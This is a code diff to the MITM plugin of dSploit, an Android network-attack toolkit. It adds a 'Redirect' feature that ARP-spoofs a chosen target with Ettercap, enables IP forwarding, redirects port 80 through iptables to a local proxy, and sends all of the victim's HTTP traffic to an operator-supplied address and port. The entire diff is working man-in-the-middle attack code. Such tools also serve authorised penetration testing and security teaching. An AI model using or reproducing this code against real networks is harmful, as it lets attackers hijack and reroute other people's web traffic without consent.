@@ -44,6 +44,8 @@ import android.widget.Toast;
 import it.evilsocket.dsploit.R;
 import it.evilsocket.dsploit.core.System;
 import it.evilsocket.dsploit.core.Plugin;
+import it.evilsocket.dsploit.gui.dialogs.RedirectionDialog;
+import it.evilsocket.dsploit.gui.dialogs.RedirectionDialog.RedirectionDialogListener;
 import it.evilsocket.dsploit.gui.dialogs.CustomFilterDialog;
 import it.evilsocket.dsploit.gui.dialogs.CustomFilterDialog.CustomFilterDialogListener;
 import it.evilsocket.dsploit.gui.dialogs.ErrorDialog;
@@ -266,6 +268,8 @@ public class MITM extends Plugin
 			System.getEttercap().kill();
 			System.getIPTables().undoPortRedirect( 80, System.HTTP_PROXY_PORT );
 			System.getProxy().stop();
+			System.getProxy().setRedirection( null, 0 );
+			System.getProxy().setFilter( null );
 			System.getServer().stop();
 			
 			for( i = 0; i < rows; i++ )
@@ -367,6 +371,74 @@ public class MITM extends Plugin
 								
 					activity.setVisibility( View.INVISIBLE );
 				}
+			}
+		}));
+        
+        mActions.add( new Action
+        ( 
+        	"Redirect", 
+        	"Redirect all the http traffic to another address.",
+        	R.drawable.action_redirect_48,
+        	new OnClickListener(){
+			@Override
+			public void onClick(View v) {
+	
+				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
+
+				if( activity.getVisibility() == View.INVISIBLE )
+				{
+					setStoppedState();
+	
+					new RedirectionDialog( "Redirection", MITM.this, new RedirectionDialogListener(){
+						@Override
+						public void onInputEntered( String address, String port ) {
+							if( address.isEmpty() == false && port.isEmpty() == false )
+							{
+								try
+								{
+									int iport = Integer.parseInt( port );
+									
+									if( iport <= 0 || iport > 65535 )
+										throw new Exception();
+									
+									activity.setVisibility( View.VISIBLE );
+									
+									Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+									
+									final String faddress = address;
+									final int	 fport	  = iport;
+									System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
+										@Override
+										public void onReady() {
+											Proxy proxy = System.getProxy();
+											
+											proxy.setRedirection( faddress, fport );
+											
+											System.setForwarding( true );
+																				
+											new Thread( proxy ).start();
+											
+											System.getIPTables().portRedirect( 80, System.HTTP_PROXY_PORT );										
+										}
+									}).start();																			
+								}
+								catch( Exception e )
+								{
+									new ErrorDialog( "Error", "Invalid port specified.", MITM.this ).show();
+								}					
+							}
+							else
+								new ErrorDialog( "Error", "Invalid address and/or port specified.", MITM.this ).show();							
+						}
+					}).show();
+				}
+				else
+				{
+					setStoppedState();
+								
+					activity.setVisibility( View.INVISIBLE );
+				}
+				
 			}
 		}));
         
